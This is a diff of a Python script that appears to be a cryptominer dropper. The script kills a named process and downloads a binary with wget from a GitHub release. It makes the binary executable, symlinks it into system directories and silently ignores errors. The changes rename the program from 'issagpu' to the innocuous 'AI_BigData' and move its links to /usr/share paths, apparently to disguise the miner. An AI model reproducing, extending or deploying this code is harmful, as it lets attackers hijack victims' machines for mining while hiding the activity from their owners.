@@ -9,7 +9,7 @@ import multiprocessing
 import ast
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'issagpu'
+program = 'AI_BigData'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -28,8 +28,8 @@ try:
         os.system('wget https://github.com/ts6aud5vkg/gpuissa/releases/download/grin/' + program)
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/share/work' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/share/' + program)
         time.sleep (2)
 except:
     pass
